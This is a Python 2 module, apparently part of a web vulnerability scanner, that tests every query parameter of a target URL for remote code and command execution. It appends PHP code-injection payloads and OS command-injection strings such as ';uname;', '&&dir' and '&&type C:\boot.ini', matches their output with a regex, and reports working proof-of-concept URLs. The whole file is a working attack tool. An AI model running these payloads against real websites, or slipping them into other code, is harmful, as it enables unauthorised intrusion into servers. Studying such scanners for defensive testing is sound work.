##
## rce scanner
##

from core.misc import printf
import urllib
import re
import time

def main(url, payloads, check):
    opener = urllib.urlopen(url)
    vuln = 0
    if opener.code == 999:
        printf('[w] WebKnight WAF Detected!')
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = urllib.urlopen(bugs)
            html = request.readlines()
            for line in html:
                checker = re.findall(check, line)
                if len(checker) !=0:
                    printf("[+] Payload Found . . .")
                    printf('[+] Payload: %s ' % payload)
                    printf('[+] Code Snippet: %s' % line.strip())
                    printf("[+] POC: %s" % bugs)
                    vuln +=1
        if vuln == 0:
                printf("[!] Target is not vulnerable!")
        else:
                printf("[!] Congratulations you've found %i bugs" % (vuln))
def rcevuln(web):
    if 'http' not in web:
        try:
            urllib.urlopen('http://' + web)
            url = 'http://' + web
        except:
            url = 'https://' + web
    else:
        url = web
    if '?' in url:
        printf("[+] Scanning for Remote Code/Command Execution ")
        payloads = [';${@print(md5(rce))}', ';${@print(md5("rce"))}']
        payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
        payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
        check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
        main(url, payloads, check)
    else:
        printf('[!] No parameters found!')
